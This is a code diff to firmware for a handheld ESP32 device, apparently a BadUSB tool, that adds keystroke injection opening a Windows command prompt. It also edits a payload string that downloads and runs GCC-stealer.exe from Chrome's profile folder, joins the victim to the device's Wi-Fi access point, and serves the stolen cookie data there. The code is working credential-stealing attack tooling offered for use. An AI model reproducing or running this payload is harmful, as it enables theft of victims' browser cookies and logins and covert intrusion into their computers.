@@ -52,11 +52,27 @@ void demo_macos(){ // 4
 }
 
 void demo_windows(){ // 5
+    Keyboard.begin();
+    USB.begin();
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 0);
     DISP.setTextColor(BGCOLOR, FGCOLOR);
     DISP.println("windows demo");
     DISP.setTextColor(FGCOLOR, BGCOLOR);
+    DISP.println("Running payload...");
+    delay(2000);   
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+    delay(1000);
+    Keyboard.print("cmd");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    delay(1000);
+    Keyboard.print(GET_ASCII_ART);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    DISP.print("done.");
     DISP.printf(TXT_SEL_BACK);
 }
 
@@ -145,7 +161,7 @@ IPAddress runPayloadServer(){
   WiFi.mode(WIFI_AP);
   WiFi.softAP(ssid, password);
   IPAddress IP = WiFi.softAPIP();
-  DISP.println("AP: "+ssid);
+  DISP.println("SSID: "+ssid);
   DISP.println("PSW: "+password);
   server.serveStatic("/", SD, full_files_dir.c_str());
   // Serve the HTML file as the default route
@@ -179,7 +195,7 @@ void run_payload_setup(){
   " & cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
   " && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe" \
   " && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml" \
-  " && netsh wlan delete profile "+ssid+"" \
+  /*" && netsh wlan delete profile "+ssid+"" \*/
   " && netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\"" \
   " && netsh wlan connect name="+ssid+"" \
   " && .\\GCC-stealer.exe --json-file" \
@@ -297,383 +313,3 @@ void drawmenuL() {
     }
   }
 }
-
-// Ignore...
-
-// 24 - Bad USB
-// 25 - Bad USB Wifi Scan
-// 26 - Bad USB Wifi scan results
-// 27 - Run Payload 0
-
-#if false
-
-int uptimeL(){
-  return(int(millis() / 1000));
-}
-
-void screenBrightnessL(int bright){
-  Serial.printf("Brightness: %d\n", bright);
-  #if defined(AXP)
-    M5.Axp.ScreenBreath(bright);
-  #endif
-  #if defined(BACKLIGHT)
-    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
-    analogWrite(BACKLIGHT, bl);
-  #endif
-}
-
-void dimtimerL(){
-  if(screen_dim_dimmedL){
-    screenBrightnessL(brightness);
-    screen_dim_dimmedL = false;
-  }
-  screen_dim_currentL = uptimeL() + screen_dim_timeL + 2;
-}
-
-bool check_next_pressL(){
-#if defined(KB)
-  M5Cardputer.update();
-  if (M5Cardputer.Keyboard.isKeyPressed(';')){
-    // hack to handle the up arrow
-    cursor = cursor - 2;
-    dimtimerL();
-    return true;
-  }
-  //M5Cardputer.update();
-  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
-    dimtimerL();
-    return true;
-  }
-#else
-  if (digitalRead(M5_BUTTON_RST) == LOW){
-    dimtimerL();
-    return true;
-  }
-#endif
-  return false;
-}
-
-bool check_select_pressL(){
-#if defined(KB)
-  M5Cardputer.update();
-  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
-    dimtimerL();
-    return true;
-  }
-#else
-  if (digitalRead(M5_BUTTON_HOME) == LOW){
-    dimtimerL();
-    return true;
-  }
-#endif
-  return false;
-}
-
-void run_payload_loop(){
-  if (check_next_pressL()) {
-    rstOverride = true;
-    isSwitching = true;
-    current_proc = 24;
-  }
-}
-
-void busb_setup(){
-  rstOverride = false;  
-  cursor = 0;
-  DISP.fillScreen(BGCOLOR);
-  DISP.setTextSize(BIG_TEXT);
-  DISP.setCursor(0, 0);
-  DISP.println(PYLD_DWNLD);
-  delay(2000);
-}
-
-void busb_loop(){
-    DISP.fillScreen(BGCOLOR);
-    DISP.setTextSize(MEDIUM_TEXT);
-    DISP.setCursor(0, 0);
-    DISP.println(TXT_WF_SCNING);
-    wifict = WiFi.scanNetworks();
-    DISP.fillScreen(BGCOLOR);
-    DISP.setTextSize(SMALL_TEXT);
-    DISP.setCursor(0, 0);
-    if(wifict > 0){
-      isSwitching = true;
-      current_proc=26;
-    }
-}
-
-void busb_drawmenu() {
-  char ssid[19];
-  DISP.setTextSize(SMALL_TEXT);
-  DISP.fillScreen(BGCOLOR);
-  DISP.setCursor(0, 0);
-  // scrolling menu
-  if (cursor > 4) {
-    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
-      if(cursor == i){
-        DISP.setTextColor(BGCOLOR, FGCOLOR);
-      }
-      DISP.print(" ");
-      DISP.println(WiFi.SSID(i).substring(0,19));
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-    }
-  } else {
-    for ( int i = 0 ; i < wifict ; i++ ) {
-      if(cursor == i){
-        DISP.setTextColor(BGCOLOR, FGCOLOR);
-      }
-      DISP.print(" ");
-      DISP.println(WiFi.SSID(i).substring(0,19));
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-    }
-  }
-  if(cursor == wifict){
-    DISP.setTextColor(BGCOLOR, FGCOLOR);
-  }
-  DISP.println(TXT_WF_RESCAN);
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-  if(cursor == wifict + 1){
-    DISP.setTextColor(BGCOLOR, FGCOLOR);
-  }
-  DISP.println(String(TXT_BACK));
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-}
-
-bool getPayload(String ssid, String password) {
-  bool downloadOK = false;
-  Serial.begin(115200);
-  // Serial.setDebugOutput(true);
-  Serial.println();
-  Serial.println();
-  Serial.println();
-
-  WiFi.mode(WIFI_STA);
-  DISP.print("Connecting to WiFi...");
-  WiFi.begin(ssid, password);
-  int count = 0;
-  while (WiFi.status() != WL_CONNECTED)
-  {
-    if(count == 10){
-      break;
-    }
-    delay(1000);
-    count++;
-  }
-  if(count == 10 && WiFi.status() != WL_CONNECTED){
-    DISP.println( " failed to connect.");
-    WiFi.disconnect();
-    return downloadOK;
-  } else {
-    DISP.println(" connected!");
-  }
-
-  File file = SD.open(PYLD_PATH, FILE_WRITE);
-
-  if (!file) {
-    DISP.println("Failed to open file for writing.");
-    WiFi.disconnect();
-    return downloadOK;
-  }
-
-  WiFiClientSecure *client = new WiFiClientSecure;
-  if(client) {
-    client -> setCACert(ROOT_CA_CRT);
-    // Add a scoping block for HTTPClient https to make sure it is destroyed before WiFiClientSecure *client is 
-    HTTPClient https;
-    https.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
-    //DISP.print("[HTTPS] begin...\n");
-    if (https.begin(*client, PYLD_RMT_PATH)) {  // HTTPS
-      //DISP.print("[HTTPS] GET...\n");
-      // start connection and send HTTP header
-      int httpCode = https.GET();
-
-      // httpCode will be negative on error
-      if (httpCode > 0) {
-        // HTTP header has been send and Server response header has been handled
-        DISP.printf("[HTTPS] GET code %d\n", httpCode);
-        // file found at server
-        if (httpCode == HTTP_CODE_OK) {
-          DISP.print("[HTTPS] GET downloading...");
-          https.writeToStream(&file);
-          DISP.println(" done!");
-          downloadOK = true;
-        }
-      } else {
-        DISP.printf("[HTTPS] GET... failed, error: %d\n", httpCode);
-      }
-
-      https.end();
-    } else {
-      DISP.printf("[HTTPS] Unable to connect\n");
-    }
-  }
-  WiFi.disconnect();
-  return downloadOK;
-}
-
-void busb_result_setup() {
-  cursor = 0;
-  rstOverride = true;
-  busb_drawmenu();
-  delay(500); // Prevent switching after menu loads up
-}
-
-void busb_result_loop(){
-  if (check_next_pressL()) {
-    cursor++;
-    cursor = cursor % ( wifict + 2);
-    busb_drawmenu();
-    delay(250);
-  }
-  if (check_select_pressL()) {
-    delay(250);
-    bool home_or_rescan = false;
-    if(cursor == wifict){
-      rstOverride = false;
-      current_proc = 25;
-      home_or_rescan = true;
-    }
-    if(cursor == wifict + 1){
-      rstOverride = false;
-      isSwitching = true;
-      current_proc = 24;
-      home_or_rescan = true;
-    }
-    if(!home_or_rescan){
-      String encryptType = "";
-      switch (WiFi.encryptionType(cursor)) {
-      case 1:
-        encryptType = "WEP";
-        break;
-      case 2:
-        encryptType = "WPA/PSK/TKIP";
-        break;
-      case 3:
-        encryptType = "WPA/PSK/CCMP";
-        break;
-      case 4:
-        encryptType = "WPA2/PSK/Mixed/CCMP";
-        break;
-      case 8:
-        encryptType = "WPA/WPA2/PSK";
-        break ;
-      case 0:
-        encryptType = TXT_WF_OPEN;
-        break ;
-      }
-      DISP.fillScreen(BGCOLOR);
-      DISP.setCursor(0, 0);
-      DISP.setTextColor(BGCOLOR, FGCOLOR);
-      if(WiFi.SSID(cursor).length() > 12){
-        DISP.setTextSize(SMALL_TEXT);
-      }else if(WiFi.SSID(cursor).length() > 20){
-        DISP.setTextSize(TINY_TEXT);
-      }else{
-        DISP.setTextSize(MEDIUM_TEXT);
-      }
-      String currentPSWD = "";
-      DISP.println(WiFi.SSID(cursor));
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-      DISP.setTextSize(SMALL_TEXT);
-      DISP.printf(TXT_WF_CRYPT, encryptType);
-      DISP.setTextSize(TINY_TEXT);
-      DISP.println("\nType the Password");
-      DISP.println("Press Enter to Confirm:");
-      DISP.setTextSize(SMALL_TEXT);
-      uint8_t pswdTextCursorY = DISP.getCursorY();
-      DISP.printf("%s", currentPSWD.c_str());
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-      bool pswd_ok = false;
-      while(!pswd_ok){
-        M5Cardputer.update();
-        if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
-          Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
-          if(status.del) {
-            currentPSWD.remove(currentPSWD.length() - 1);
-          }
-          if(status.enter) {
-            pswd_ok = true;
-          }
-          for(auto i : status.word) {
-              currentPSWD += i;
-          }
-          DISP.fillRect(0, pswdTextCursorY, DISP.width(), DISP.width()- pswdTextCursorY, BLACK);
-          DISP.setCursor(0, pswdTextCursorY);
-          DISP.printf("%s", currentPSWD.c_str());
-        }
-      }
-      rstOverride = true;
-      isSwitching = false;
-      DISP.fillScreen(BGCOLOR);
-      DISP.setCursor(0, 0);
-      DISP.setTextColor(FGCOLOR, BGCOLOR);
-      DISP.setTextSize(SMALL_TEXT);
-      bool downloadOK = getPayload(WiFi.SSID(cursor), currentPSWD);
-      if(downloadOK){
-        DISP.println(TXT_HOLD_BACK);
-        DISP.setTextColor(BGCOLOR, FGCOLOR);
-        DISP.printf(TXT_RUN_PYLD);
-        DISP.setTextColor(FGCOLOR, BGCOLOR);
-        while(true){
-          if(check_select_pressL()){
-            isSwitching = true;
-            current_proc = 27;
-            delay(100);
-            break;
-          }
-          if(check_next_pressL()){
-            isSwitching = true;
-            current_proc = 24;
-            delay(100);
-            break;
-          }
-          delay(1000);
-        }
-      } else {
-        DISP.printf(TXT_SEL_BACK);
-      }
-    }
-  }
-}
-
-void rootPayload0Old(){
-    if(!setupSdCard()){
-        rstOverride = true;
-        isSwitching = false;
-        DISP.fillScreen(BGCOLOR);
-        DISP.setCursor(0, 0);
-        DISP.setTextColor(FGCOLOR, BGCOLOR);
-        DISP.setTextSize(SMALL_TEXT);
-        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
-        DISP.printf(TXT_SEL_BACK);
-    } else {
-      if(createDir(SD, PYLD_DIR)){
-        bool exists = SD.exists(PYLD_PATH);
-        int sz = 0;
-        if(exists){
-          File fp = SD.open(PYLD_PATH);
-          sz = fp.size();
-          fp.close();
-        }
-        if(exists && sz == PYLD_EXP_SIZE){
-          // run payload
-          //current_proc = 25;
-          current_proc = 27;
-        } else {
-          current_proc = 25;
-        }
-        run_payload_setup();
-      } else {
-        rstOverride = true;
-        isSwitching = false;
-        DISP.fillScreen(BGCOLOR);
-        DISP.setCursor(0, 0);
-        DISP.setTextColor(FGCOLOR, BGCOLOR);
-        DISP.setTextSize(SMALL_TEXT);
-        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
-        DISP.printf(TXT_SEL_BACK);
-      }
-    }
-}
-
-#endif
